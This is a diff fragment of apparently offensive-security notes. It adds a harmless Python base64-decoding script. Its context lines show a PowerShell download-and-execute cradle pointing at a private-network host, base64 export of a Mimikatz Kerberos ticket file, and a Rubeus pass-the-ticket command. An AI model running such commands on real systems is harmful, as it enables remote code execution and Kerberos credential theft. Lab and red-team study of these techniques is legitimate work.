@@ -20,3 +20,14 @@ $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi"))
 Rubeus ptt /ticket:[...snip...]
 ```
+
+```
+#!/usr/bin/env python
+import base64
+decode = raw_input (" Enter Your Encoded Data to be decode: ")
+output = base64.b64decode(decode)
+print (output)
+f = open('base64_out.txt', 'w')
+f.write(output)
+f.close()
+```
